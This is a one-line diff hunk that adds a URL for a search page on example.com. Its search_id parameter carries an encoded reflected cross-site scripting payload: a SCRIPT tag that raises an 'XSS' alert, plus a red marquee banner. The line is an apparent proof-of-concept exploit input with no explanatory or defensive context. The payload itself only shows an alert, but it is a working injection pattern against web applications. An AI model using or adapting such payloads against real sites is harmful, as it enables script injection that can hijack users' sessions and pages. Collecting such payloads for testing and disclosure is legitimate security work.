@@ -1,0 +1,2 @@
+http://www.example.com/search_results.php?search_id='&quot;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88%2C83%2C83))&lt;%2FSCRIPT&gt;&lt;MARQUEE+BGCOLOR%3D&quot;RED&quot;&gt;&lt;H1&gt;Xss&lt;%2FH1&gt;&lt;%2FMARQUEE&gt;&search=Search
+
